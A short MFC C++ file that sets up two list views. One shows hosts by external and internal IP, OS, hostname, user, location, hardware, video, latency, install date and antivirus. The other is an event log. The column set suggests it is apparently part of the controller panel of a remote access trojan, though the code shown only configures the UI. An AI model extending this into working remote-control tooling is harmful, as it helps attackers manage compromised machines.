// ListCtrlInitializer.cpp
#include "ListCtrlInitializer.h"

void CListCtrlInitializer::InitializeWiznextList(CListCtrl* pListCtrl)
{
    if (pListCtrl) {
        pListCtrl->SetExtendedStyle(pListCtrl->GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        pListCtrl->InsertColumn(0, _T("外网-IP"), LVCFMT_LEFT, 140);
        pListCtrl->InsertColumn(1, _T("内网-IP"), LVCFMT_LEFT, 140);
        pListCtrl->InsertColumn(2, _T("系统"), LVCFMT_LEFT, 160);
        pListCtrl->InsertColumn(3, _T("主机名"), LVCFMT_LEFT, 180);
        pListCtrl->InsertColumn(4, _T("用户名"), LVCFMT_LEFT, 180);
        pListCtrl->InsertColumn(5, _T("地理位置"), LVCFMT_LEFT, 180);
        pListCtrl->InsertColumn(6, _T("CPU"), LVCFMT_LEFT, 180);
        pListCtrl->InsertColumn(7, _T("内存"), LVCFMT_LEFT, 180);
        pListCtrl->InsertColumn(8, _T("硬盘"), LVCFMT_LEFT, 100);
        pListCtrl->InsertColumn(9, _T("视频"), LVCFMT_LEFT, 180);  
        pListCtrl->InsertColumn(10, _T("延迟"), LVCFMT_LEFT, 180);
        pListCtrl->InsertColumn(11, _T("备注"), LVCFMT_LEFT, 100);
        pListCtrl->InsertColumn(12, _T("安装日期"), LVCFMT_LEFT, 180);
        pListCtrl->InsertColumn(13, _T("杀毒"), LVCFMT_LEFT, 180);
    }
}

void CListCtrlInitializer::InitializeList1List(CListCtrl* pListCtrl)
{
    if (pListCtrl) {
        pListCtrl->SetExtendedStyle(pListCtrl->GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        pListCtrl->InsertColumn(0, _T("时间"), LVCFMT_LEFT, 180);
        pListCtrl->InsertColumn(1, _T("类型"), LVCFMT_LEFT, 180);
        pListCtrl->InsertColumn(2, _T("事件"), LVCFMT_LEFT, 260);
    }
}